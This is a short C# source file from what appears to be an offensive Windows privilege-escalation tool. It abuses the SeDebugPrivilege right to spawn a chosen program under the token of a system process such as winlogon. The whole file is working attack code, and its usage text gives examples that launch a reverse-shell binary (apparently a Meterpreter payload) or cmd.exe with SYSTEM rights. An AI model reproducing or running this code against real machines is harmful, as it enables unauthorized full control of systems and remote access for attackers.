using System;
using PSGetSys;

namespace PrivAbuser.Abuser
{
    public class SeDebugPrivilege
    {
        public static void helper()
        {
            Console.WriteLine("Usage: <exe> /abuseDebugPrivilege /process=<name> /exploit=<path>\n" +
                "Example for revshell: <exe> /abuseDebugPrivilege /process=winlogon /exploit=c:\\users\\public\\met443.exe\n" +
                "Example for GUI: <exe> /abuseDebugPrivilege /process=winlogon /exploit=c:\\windows\\system32\\cmd.exe");
        }

        public static void abuse(string process, string exploit)
        {
            var p = System.Diagnostics.Process.GetProcessesByName(process)[0];
            string[] args = new string[] { p.Id.ToString(), exploit };
            PSGetSys.Program.Main(args);
        }
    }
}
